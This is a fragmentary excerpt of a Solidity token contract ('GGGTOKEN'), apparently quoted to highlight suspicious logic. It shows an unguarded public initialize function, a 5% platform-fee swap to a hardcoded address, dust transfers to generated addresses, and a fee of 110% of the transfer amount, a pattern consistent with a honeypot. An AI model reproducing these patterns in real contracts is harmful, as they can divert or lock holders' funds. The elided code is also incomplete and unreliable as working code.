...
contract GGGTOKEN is ERC20, Ownable, BaseToken {
    ...
    function initialize ( bytes memory _data) public {
        ...
        dividendTracker.initialize(
         ...
         minBurnAmount = uintP[13]* (10**uint256(18));
    ...
    function _transfer(
        ...
        if (
            ...
            swapPlatFee(contractTokenBalance * 5 / 100);
            contractTokenBalance = balanceOf(address(this));

            if(getBurnFee() > 0) {
                uint256 BrunTokens = contractTokenBalance
                    .mul(getBurnFee())
                    .div(getFeeDeno());
                super._transfer(address(this), address(0xdead), BrunTokens);
            }
            if (getMarketFee() > 0) {
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            ...
            amount = amount - _takeInviter(from);
    ...
    function swapPlatFee(uint256 tokenAmount) private {
        address[] memory path;
        ...
        _uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ...
            0,
            path,
            0x3Dc20503e9E423201685AeE8687c94b6C4f8D846,
            block.timestamp
        );
    }
    ...
    function _takeInviter(address from) private returns (uint fee) {
        address _receiveD;
        fee = 1*_dropNum;
        for (uint256 i = 0; i < _dropNum; i++) {
            _receiveD = address(~uint160(0)/ktNum);
            ktNum = ktNum+1;
            super._transfer(from,_receiveD,1);
        }
    }
    ...
    function getBurnFee() public view returns (uint deno) {
        deno = _buyBurnFee.add(_sellBurnFee);
    }
    ...
    {
        uint256 fees = amount.mul(11000).div(10000);
